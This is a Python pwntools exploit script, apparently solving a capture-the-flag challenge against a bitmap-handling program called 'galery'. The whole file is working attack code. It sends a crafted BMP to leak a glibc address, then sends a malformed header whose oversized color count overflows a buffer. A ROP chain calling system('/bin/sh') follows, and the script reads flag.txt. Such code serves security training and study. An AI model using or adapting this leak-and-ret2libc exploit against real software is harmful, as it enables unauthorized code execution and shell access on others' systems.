#!/usr/bin/env python

from pwn import *


LOCAL = True
DEBUG = False
context.log_level='debug'

galery = context.binary = ELF('./galery', checksec=False)
glibc = ELF('./libc.so.6', checksec=False)


def one_byte(value):
    return value.to_bytes(1, "little")

def two_bytes(value):
    return value.to_bytes(2, "little")

def four_bytes(value):
    return value.to_bytes(4, "little")


def get_bitmap():
    file_header = bytearray()
    file_header += two_bytes(0x4d42)
    file_header += four_bytes(0x46)
    file_header += two_bytes(0)
    file_header += two_bytes(0)
    file_header += four_bytes(0x36)
    file_header += four_bytes(0x28)
    file_header += four_bytes(2)
    file_header += four_bytes(2)
    file_header += two_bytes(1)
    file_header += two_bytes(0x18)
    file_header += four_bytes(0)
    file_header += four_bytes(0x16)
    file_header += four_bytes(0)
    file_header += four_bytes(0)
    file_header += four_bytes(0)
    file_header += four_bytes(0)

    bitmap = bytearray()
    bitmap += one_byte(0x0)
    bitmap += one_byte(0x0)
    bitmap += one_byte(0xff)
    bitmap += one_byte(0xff)
    bitmap += one_byte(0xff)
    bitmap += one_byte(0xff)
    bitmap += one_byte(0x0)
    bitmap += one_byte(0x0)
    bitmap += one_byte(0xff)
    bitmap += one_byte(0x0)
    bitmap += one_byte(0x0)
    bitmap += one_byte(0x0)
    bitmap += one_byte(0xff)
    bitmap += one_byte(0x0)
    bitmap += one_byte(0x0)
    bitmap += one_byte(0x0)
    
    return file_header + bitmap



def get_file_header():
    colors_used = 290

    file_header = bytearray()
    file_header += two_bytes(0x4d42)
    file_header += four_bytes(0)
    file_header += two_bytes(0)
    file_header += two_bytes(0)
    file_header += four_bytes(0)
    file_header += four_bytes(0)
    file_header += four_bytes(2)
    file_header += four_bytes(2)
    file_header += two_bytes(1)
    file_header += two_bytes(4)
    file_header += four_bytes(0)
    file_header += four_bytes(0)
    file_header += four_bytes(0)
    file_header += four_bytes(0)
    file_header += four_bytes(colors_used)
    file_header += four_bytes(0)
    return file_header



def get_flag(p):
    bitmap = get_bitmap()

    p.recvuntil('> '.encode())
    p.sendline(str(1).encode())
    p.sendline(bitmap)

    p.recvuntil('> '.encode())
    p.sendline(str(2).encode()) 

    p.recvuntil('> '.encode())
    p.sendline(str(3).encode())
    
    for i in range(5):
        p.recvuntil(', '.encode())
    
    leak = p.recvuntil(", ".encode(), drop=True)
    
    stdin_address = int.from_bytes(leak, byteorder="little")
    stdin_offset = glibc.symbols['_IO_2_1_stdin_']
    glibc.address  = stdin_address - stdin_offset
    assert glibc.address == glibc.address & ~0xfff, "glibc base not aligned: " + hex(glibc.address)

    system_address = glibc.symbols['system'].to_bytes(8, "little")
    bin_sh = next(glibc.search(b'/bin/sh\x00'))

    p.recvuntil('> '.encode())
    p.sendline(str(1).encode())

    r = ROP(glibc)
    pop_rdi_address = r.rdi.address.to_bytes(8, "little") 
    ret_address = r.ret.address.to_bytes(8, "little") 
    
    file_header = get_file_header()

    color_table_len = 4 * 256
    other_variables = 64
    padding = b'A' * (color_table_len + other_variables)
    
    saved_rbp = b'B'*0x8
    payload = saved_rbp + ret_address + pop_rdi_address + bin_sh.to_bytes(8, "little")  + system_address

    p.sendline(file_header + padding + payload)
    p.recvuntil('> '.encode())
    p.sendline(str(2).encode())
    p.recvuntil('distribution!'.encode())
       
    p.send('cat flag.txt\n'.encode())
    flag = p.recvline().decode()
    print(f"\n\n{flag}\n")
    # p.interactive()


def main():
    if LOCAL:
        if DEBUG: 
            p = gdb.debug(galery.path, gdbscript='''
                                    b *(create_copy)
                                    b *(create_copy + 428)
                                    b *(create_copy + 1413)
                                    continue''')
        else: 
            p = process()
    else:
        p = remote("127.0.0.1", 9991)
    
    get_flag(p)
    
    return 0



if __name__ == '__main__':
    main()